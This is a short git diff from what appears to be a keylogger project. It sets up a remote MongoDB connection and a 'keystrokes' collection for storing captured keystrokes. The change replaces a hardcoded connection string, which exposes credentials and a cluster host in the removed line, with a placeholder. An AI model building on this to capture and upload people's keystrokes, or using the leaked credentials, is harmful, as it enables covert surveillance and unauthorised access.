@@ -1,8 +1,8 @@
 import pymongo
 import apple_keycodes
 
-cluster = pymongo.MongoClient("mongodb+srv://keylogger-test:test-keylogger@keylogger-test.vqheiq3.mongodb.net"
-                              "/?retryWrites=true&w=majority")
+cluster = pymongo.MongoClient("mongodb+srv://user:password@cluster.abcedf.mongodb.net"
+                              "/?retryWrites=true&w=majority") #available at mongo atlas
 
 mongo_db = cluster["database"]
 keystrokes_collections = mongo_db["keystrokes"]
